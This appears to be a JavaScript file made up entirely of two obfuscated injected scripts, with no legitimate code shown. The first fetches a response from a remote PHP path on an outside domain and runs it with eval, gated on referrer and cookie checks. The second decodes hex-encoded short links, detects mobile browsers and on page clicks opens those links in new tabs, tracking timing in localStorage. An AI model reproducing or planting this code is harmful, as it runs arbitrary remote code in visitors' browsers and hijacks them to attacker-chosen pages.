            ;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4e\x78\x4f\x39\x63\x35','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x61\x67\x38\x63\x31','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x66\x42\x63\x35\x63\x31','8SJGLkz','random','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x66\x75\x31\x63\x36','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x64\x43\x32\x63\x33','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x75\x52\x34\x63\x32','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x57\x4c\x72\x33\x63\x37','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4d\x74\x6b\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x52\x4a\x36\x63\x33','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4b\x68\x66\x37\x63\x34',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());